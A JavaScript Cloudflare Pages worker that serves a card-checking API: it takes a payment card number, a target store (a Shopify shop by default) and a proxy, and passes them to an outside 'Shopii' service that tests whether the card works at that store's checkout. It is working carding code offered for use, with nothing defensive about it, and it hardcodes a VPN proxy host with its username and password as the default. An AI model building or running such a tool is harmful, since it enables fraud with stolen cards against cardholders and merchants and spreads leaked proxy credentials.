// Cloudflare Pages Function (_worker.js)
// Handles both static assets and API proxy

export const onRequest = async (context) => {
    const { request } = context;
    const url = new URL(request.url);

    // Handle CORS preflight
    if (request.method === 'OPTIONS') {
        return new Response(null, {
            status: 204,
            headers: {
                'Access-Control-Allow-Origin': '*',
                'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
                'Access-Control-Allow-Headers': '*',
            }
        });
    }

    // API endpoint for card checking
    if (url.pathname === '/api/check' && url.searchParams.get('cc')) {
        try {
            const site = url.searchParams.get('site') || 'https://artpop.com';
            const cc = url.searchParams.get('cc');
            const proxy = url.searchParams.get('proxy') || 'px014236.pointtoserver.com:10780:purevpn0s11127688:4mwmyaoa';

            // Call Shopii API
            const shopiiUrl = `https://shopii-api-production.up.railway.app/shopify?site=${encodeURIComponent(site)}&cc=${encodeURIComponent(cc)}&proxy=${encodeURIComponent(proxy)}`;
            
            console.log(`Checking card: ${cc.substring(0, 8)}... via ${proxy.substring(0, 20)}...`);
            
            const response = await fetch(shopiiUrl, {
                method: 'GET',
                headers: {
                    'Accept': 'application/json',
                    'User-Agent': 'ShopiiPro/1.0'
                },
                signal: AbortSignal.timeout(30000) // 30 second timeout
            });

            if (!response.ok) {
                throw new Error(`Shopii API error: ${response.status}`);
            }

            const data = await response.json();
            console.log(`Result: ${data.Status} - ${data.Response}`);

            // Return with CORS headers
            return new Response(JSON.stringify(data), {
                status: 200,
                headers: {
                    'Content-Type': 'application/json',
                    'Access-Control-Allow-Origin': '*',
                    'Access-Control-Allow-Methods': 'GET, OPTIONS',
                    'Access-Control-Allow-Headers': '*'
                }
            });

        } catch (error) {
            console.error('Worker error:', error);
            
            // Return error response
            return new Response(JSON.stringify({
                error: true,
                message: error.message,
                Status: 'Error',
                Response: 'API_ERROR'
            }), {
                status: 500,
                headers: {
                    'Content-Type': 'application/json',
                    'Access-Control-Allow-Origin': '*'
                }
            });
        }
    }

    // For all other requests, let Cloudflare Pages handle static files
    return await context.next();
};
